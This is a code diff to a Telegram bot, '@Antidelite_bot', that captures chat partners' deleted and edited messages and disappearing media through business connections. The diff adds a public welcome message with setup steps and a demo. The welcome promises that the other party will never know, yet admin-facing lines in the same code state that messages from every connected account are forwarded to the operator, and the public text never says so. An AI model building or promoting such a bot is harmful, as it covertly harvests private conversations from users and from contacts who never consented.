@@ -20,7 +20,10 @@ from aiogram.filters import Command
 from aiogram.types import (
     BusinessConnection,
     BusinessMessagesDeleted,
+    CallbackQuery,
     FSInputFile,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
     Message,
 )
 
@@ -32,6 +35,20 @@ MAX_DOWNLOAD = 20 * 1024 * 1024  # лимит Bot API на скачивание
 
 MEDIA_DIR = DATA_DIR / "media"
 MEDIA_DIR.mkdir(parents=True, exist_ok=True)
+
+BOT_USERNAME = "@Antidelite_bot"
+BANNER = Path(__file__).parent / "banner.png"
+
+WELCOME = (
+    "🗑 <b>Удалили или изменили сообщение? Покажу, что там было.</b>\n"
+    "Ещё ловлю исчезающие фото и видео.\n\n"
+    "<b>Как подключить за 3 шага:</b>\n"
+    "1️⃣ Профиль → <b>Изменить</b> → <b>Автоматизация чатов</b>\n"
+    f"2️⃣ Вставь в поиск имя бота: <code>{BOT_USERNAME}</code> (нажми, чтобы скопировать)\n"
+    "3️⃣ Нажми <b>Добавить</b> — и готово\n\n"
+    "Собеседник ничего не узнает, от твоего имени я ничего не пишу. "
+    "Отключить можно в любой момент там же."
+)
 
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("saver")
@@ -166,20 +183,43 @@ def acc_label(name: str) -> str:
     return f"👤 <b>Аккаунт:</b> {html.escape(name)}\n"
 
 
+def welcome_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="👀 Как это выглядит", callback_data="demo")],
+        ]
+    )
+
+
 @dp.message(Command("start"))
 async def start(m: Message):
-    if m.from_user.id != ADMIN_ID:
-        # аккаунты-владельцы жмут /start, чтобы бот мог писать им сюда
-        if db.execute(
-            "SELECT 1 FROM connections WHERE owner_id=?", (m.from_user.id,)
-        ).fetchone():
-            await m.answer("✅ Ок, сюда буду присылать удалённое и изменённое.")
-        return
-    await m.answer(
-        "Админ-чат активен. Подключай каждый аккаунт: Настройки → Telegram для бизнеса → "
-        "Чат-боты → этот бот (право читать сообщения). Всё от всех аккаунтов прилетит сюда.\n"
-        "/accounts — список подключённых."
+    # приветствие с баннером и инструкцией — всем
+    if BANNER.exists():
+        await m.answer_photo(FSInputFile(BANNER), caption=WELCOME, reply_markup=welcome_kb())
+    else:
+        await m.answer(WELCOME, reply_markup=welcome_kb())
+    # если это уже подключённый аккаунт — подтверждаем доставку сюда
+    if m.from_user.id != ADMIN_ID and db.execute(
+        "SELECT 1 FROM connections WHERE owner_id=?", (m.from_user.id,)
+    ).fetchone():
+        await m.answer("✅ Этот аккаунт подключён. Удалённое и изменённое буду слать и сюда.")
+    if m.from_user.id == ADMIN_ID:
+        await m.answer(
+            "Ты админ. Всё от всех подключённых аккаунтов прилетает сюда.\n"
+            "/accounts — список подключённых."
+        )
+
+
+@dp.callback_query(lambda c: c.data == "demo")
+async def demo(c: CallbackQuery):
+    await c.message.answer(
+        "Пример того, что придёт:\n\n"
+        "🗑 <b>Иван (@ivan)</b> удалил(а) сообщение\n\n"
+        "«Ладно, забудь, это не важно»\n\n"
+        "✏️ <b>Иван</b> изменил(а) сообщение\n"
+        "<b>Было:</b> 5000\n<b>Стало:</b> 500"
     )
+    await c.answer()
 
 
 @dp.message(Command("accounts"))
